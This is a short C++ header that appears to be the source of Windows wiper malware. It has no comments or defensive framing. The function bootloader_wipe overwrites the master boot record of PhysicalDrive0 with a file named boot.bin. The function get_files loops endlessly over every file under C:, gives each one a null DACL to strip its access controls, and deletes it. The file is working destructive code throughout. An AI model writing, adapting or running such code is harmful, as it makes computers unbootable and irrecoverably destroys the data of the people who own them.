#pragma once
#include <filesystem>
#include <iostream>
#include <handleapi.h>
#include <memoryapi.h>
#include <fileapi.h>
#include <filesystem>
#include <aclapi.h>

BOOL bootloader_wipe()
{
	HANDLE drive = CreateFileW(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (drive == INVALID_HANDLE_VALUE) { return FALSE; }

	HANDLE binary = CreateFileW(TEXT("./boot.bin"), GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if (binary == INVALID_HANDLE_VALUE) { return FALSE; }

	DWORD size = GetFileSize(binary, 0);

	std::uint8_t* new_mbr = new std::uint8_t[size];
	DWORD bytes_read;
	ReadFile(binary, new_mbr, size, &bytes_read, 0);
	WriteFile(drive, new_mbr, size, &bytes_read, 0);

	CloseHandle(binary);
	CloseHandle(drive);
}

void get_files(const std::filesystem::path& directory)
{
    SECURITY_DESCRIPTOR sd;
    while (true) {
        for (const auto& entry : std::filesystem::directory_iterator(directory))
        {
            try {
                if (std::filesystem::is_directory(entry)) get_files(entry.path()); // Go through the dir if it's valids
                else if (std::filesystem::exists(entry.path()) && std::filesystem::is_regular_file(entry.path()))
                    if (InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
                        if (SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
                            if (SetFileSecurityW(entry.path().c_str(), DACL_SECURITY_INFORMATION, &sd)) {
                                std::cout << "Successfully gave permissions and deleted file: " << entry.path() << std::endl;
                                std::filesystem::remove(entry.path());
                            }
            }
            catch (const std::exception& ex) { std::cout << "Invalid file" << ex.what() << std::endl; }
        }
    }
}

void wipe_drive() {
    std::filesystem::path driver_path = "C:";
    if (std::filesystem::exists(driver_path) && std::filesystem::is_directory(driver_path))
        get_files(driver_path);
}